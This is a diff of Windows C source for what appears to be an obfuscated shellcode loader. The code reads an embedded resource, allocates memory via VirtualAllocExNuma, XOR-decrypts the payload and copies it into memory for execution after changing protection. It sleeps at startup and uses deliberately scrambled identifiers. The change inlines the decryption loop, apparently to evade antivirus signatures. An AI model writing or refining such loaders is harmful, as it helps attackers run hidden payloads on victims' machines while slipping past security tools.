@@ -15,18 +15,6 @@ void resloamadappa(const char* enapparename, char** data, DWORD* size) {
 }
 
 
-
-
-
-
-
-void callingthefunc_enc(char* coddmanku1, DWORD lenofcod1, unsigned char* ke44y5, DWORD k2e3y1en) {
-    for (DWORD a = 0; a < lenofcod1; a++) {
-        coddmanku1[a] ^= ke44y5[a % k2e3y1en]; 
-    }
-}
-
-
 int main() {
     Sleep(2500);
 
@@ -39,7 +27,9 @@ int main() {
     resloamadappa("dhanushcode56", &kkcode, &kkcodeLen);
 
     LPVOID sirajpura = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
-    callingthefunc_enc(kkcode, kkcodeLen, keu789 , keu789Len);
+    for (DWORD a = 0; a < kkcodeLen; a++) {
+        kkcode[a] ^= keu789[a % keu789Len]; 
+    }
 
     memcpy(sirajpura, kkcode, kkcodeLen);
     DWORD oldProtect;
